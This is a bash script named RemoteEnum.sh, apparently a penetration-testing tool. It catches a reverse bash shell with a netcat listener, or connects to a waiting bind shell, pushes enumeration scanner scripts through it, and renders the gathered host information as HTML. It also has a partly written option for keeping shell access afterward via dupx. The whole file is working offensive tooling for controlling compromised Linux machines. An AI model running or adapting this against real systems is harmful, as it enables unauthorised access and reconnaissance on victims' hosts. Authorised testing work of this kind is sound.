#!/bin/bash
clear;
set -m

title="Remote Linux Enumerator"
v="0.21 - beta"
description="Remotely contacts Information Gathering in a Linux PC and feeds the results in HTML"

help(){
echo
echo $description
echo
echo "	Usage:"
echo "	RemoteEnum.sh [-n SCAN_NAME] CONNECTION_TYPE [OPTIONS]"
echo
echo "	CONNECTION_TYPE:"
echo
echo " 		Bind and Wait:"
echo "	-b PORT	"
echo "	Example:"
echo "		RemoteEnum.sh -n scan -b 4444"
echo " 	Wait for a reverse (bash) shell at PORT and the scan is run when the shell arrives."
echo
echo "		Go and get it:"
echo "	-c IP:PORT"
echo "	Example:"
echo "		RemoteEnum.sh -n scan -c 192.168.1.15:4444"
echo " 	If we know that there is a 'bash' waiting at a certain PORT of the target IP "
echo "we connect and enumerate the target"
echo
echo "		Self Scan:"
echo "	-s"
echo "	Example:"
echo "		RemoteEnum.sh -n myPC -s"
echo " 	Runs the whole scan to the host PC (via /bin/bash)"
echo
echo
echo
echo "	OPTIONS:"
echo "	-m				-- NOT YET"
echo "		Attempt to maintain shell access to the remote machine after the scan is finished."
echo "	(Needs 'dupx' to work)"
echo
echo "	-q"
echo "		Doesn't spawn firefox with the scan results."
echo "	Instead prints the result location in terminal"
}

abort(){

nc_pid=$1
page=$2
echo;
echo "Aborted by user!";
kill -9 $nc_pid 2>/dev/null 1>&2
rm -f $page
exit;

}


#####################################################	ARGUMENT HANDLING

connect=0
bind=0
quiet=0
self=0
maintain=0
page=""
scan_folder="scan_files"
scanner_folder="scanners"
scanners=$(ls $scanner_folder)

clear;
echo "$title  version: $v"
#echo "$description"
echo

if [ $# -eq 0 ]; then
	help;
	exit
fi

while getopts "n:c:b:qhsm" option;
do
	case "${option}" in

		h*)	help;exit;;

		n)	page="${OPTARG}.xml"	;;

		b)	port=${OPTARG};
			bind=1		;;

		c)	opt=${OPTARG}
			ip=`echo $opt | cut -d: -f1`
			port=`echo $opt | cut -d: -f2`
			connect=1			;;
		q)	quiet=1			;;

		s)	self=1			;;
		m)	maintain=1			;;
               *)help;exit;;
	esac
done
################################################################################################


#rm scan_files/*.html 2>/dev/null
comm=""
if [ "$page" = "" ]; then
	page="Scan-`date +"%d%m%y%H%M"`.xml"
	echo "HTML page filename is set to: \"$page\""
fi
echo

page="$scan_folder/$page"

temp_scanner="temp.scan"
scanner_file="scanner.new.sh"
init="scanner.init"

scanner_array="comm_groups=("
for i in $scanners; do
	scanner_array="$scanner_array\"$(echo $i | cut -d. -f2)\" "
done
#echo $len
scanner_array="$scanner_array)"
#echo $scanner_array

IFS_DE=$IFS
IFS="^"

cat $init > $temp_scanner
echo $scanner_array >> $temp_scanner
cat $scanner_folder/* >> $temp_scanner
cat $scanner_file >> $temp_scanner
scanner_file=$temp_scanner
IFS=$IFS_DE


if [ $bind -eq 1 ];	then
	echo "RemoteEnum will bind to port $port via netcat"
	echo "and wait for reverse connection!"
	comm="nc -nlvp $port < $scanner_file > $page"
	echo
	echo "The command is:"
	echo "\"$comm\""
fi

if [ $connect -eq 1 ];	then
	echo "RemoteEnum will connect to IP $ip and port $port via netcat"
	echo "a 'bash' shell must be waiting there..."
	echo
	comm="netcat $ip $port < $scanner_file > $page"
	echo "The command is:"
	echo "\"$comm\""
fi

if [ $self -eq 1 ];	then
	echo "RemoteEnum will run a local scanner with /bin/bash"
	comm="bash $scanner_file > $page "
fi

echo
echo


eval " $comm &"
nc_pid=$!

#echo "Nc = $nc_pid"
#exit

while [ "`cat $page | tail -1`" != "</scan>" ]; do
	sleep 1
	test $? -gt 128 && abort $nc_pid $page

done
echo "---------------------		Done!!!		---------------------"
echo
echo

rm $temp_scanner

################################################	XML FORMATTING

#	Isolate XML in output using python split()
DEL="<?xml"
python -c 'import sys; text = open(sys.argv[2],"r").read(); \
 delim = sys.argv[1]; \
 text= text.split(delim,1)[-1].strip().replace("\\!","!"); \
 file(sys.argv[2],"w").write(delim+" "+text)'  $DEL $page


if [ "$(cat $page)" = "" ]; then
	echo "Scanfile empty. Exiting..."

elif [ $quiet -eq 0 ]; then
	echo
#	rm scan_files/*.xml.html 2>/dev/null
	echo "Creating HTML Document..."
	xsltproc template.xsl $page -o $page.html 2>/dev/null
#	ln -f "/var/www/html/$page.html" "$page.html"
#	service apache2 start

	firefox $(pwd)/$page.html 2>/dev/null 1>/dev/null &
#	firefox localhost/$page.html 2>/dev/null 1>/dev/null &

elif [ $quiet -eq 1 ]; then
	echo "The HTML is located at $(pwd)/$page.html"
fi


###################################################	SHELL CLAIM
if  [ $maintain -eq 1 ]; then

	dupx_exists=$(eval "which dupx")
	if [ "$dupx_exists" != "" ]; then
		echo "Netcat PID: $nc_pid"

#		rm /proc/$nc_pid/fd/1 /proc/$nc_pid/fd/2 /proc/$nc_pid/fd/3
#		./fdswap.sh $page  /dev/stdout $nc_pid
#		./fdswap.sh $scanner_file  /dev/stdin $nc_pid

#		ln  /dev/stdin /proc/$nc_pid/fd/0
#		ln  /dev/stdout /proc/$nc_pid/fd/1
#		ln  /dev/stderr /proc/$nc_pid/fd/2

#		dupx  $nc_pid
#		dupx -q -n 0:/dev/stdin -n 1:/dev/stdout -e /dev/stderr $nc_pid 2>/dev/null 1>&2
#		dupx  -i /dev/stdin -o /dev/stdout -e /dev/stderr $nc_pid 
#		dupx -q $nc_pid </dev/stdin >/dev/stdout 2>/dev/stderr

		echo "Now enjoy your shell!"
#		jobs
		fg %1
	else
		echo "Download 'dupx' at http://www.isi.edu/~yuri/dupx/"
		echo "to maintain the shell access after a scan"
		echo "(by dupping the NetCat File Descriptors to stdIO)"
		kill $nc_pid
	fi

else

	kill $nc_pid
fi

